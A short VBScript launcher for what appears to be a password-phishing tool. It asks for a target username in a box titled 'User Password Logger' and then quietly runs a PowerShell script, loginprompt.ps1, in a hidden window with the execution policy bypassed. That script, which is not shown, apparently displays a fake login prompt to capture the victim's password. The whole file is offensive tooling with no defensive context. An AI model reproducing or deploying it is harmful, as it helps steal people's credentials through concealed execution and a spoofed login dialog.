Dim objShell, strName
UserName = InputBox("Enter Target Username:","User Password Logger","administrator")
Set objShell = CreateObject("WScript.Shell")
strCommand = "powershell.exe -ExecutionPolicy Bypass -File loginprompt.ps1 -username " & UserName
objShell.Run strCommand, 0
Set objShell = Nothing
